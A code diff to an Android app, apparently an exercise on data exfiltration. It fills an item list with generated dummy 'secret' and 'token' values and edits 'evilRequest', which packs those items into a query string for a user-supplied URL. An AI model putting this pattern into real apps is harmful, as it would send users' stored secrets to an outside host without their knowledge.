@@ -17,6 +17,7 @@ import android.widget.Toast;
 
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.Random;
 
 // ************************************************************
 // ** Read and edit this file *********************************
@@ -234,6 +235,19 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
         updateEmptyMessageVisibility();
     }
 
+    private static final String ALLOWED_CHARACTERS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+    private static String getRandomString(final int size) {
+        final Random random = new Random();
+        final StringBuilder sb = new StringBuilder(size);
+        for (int i = 0; i < size; ++i) {
+            sb.append(ALLOWED_CHARACTERS.charAt(
+                random.nextInt(ALLOWED_CHARACTERS.length())
+            ));
+        }
+        return sb.toString();
+    }
+
     /**
      * This is an important part of the application!
      * How we read data from the system.
@@ -241,8 +255,10 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      * @param view - this is the button clicked.
      */
     public void addItem(View view) {
-        // TODO
-        mItemsData.add(new Item("EXAMPLE", "EXAMPLE"));
+        mItemsData.add(new Item(
+            "secret_" + mItemsData.size(),
+            "token_" + getRandomString(16)
+        ));
         mAdapter.notifyDataSetChanged();
         updateEmptyMessageVisibility();
     }
@@ -254,7 +270,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      */
     @Override
     public void onYes(String url) {
-        StringBuilder evilRequest = new StringBuilder("/evilstuff?");
+        StringBuilder evilRequest = new StringBuilder("/?");
         for (Item item : mItemsData) {
             evilRequest
                 .append(Uri.encode(item.getTitle()))
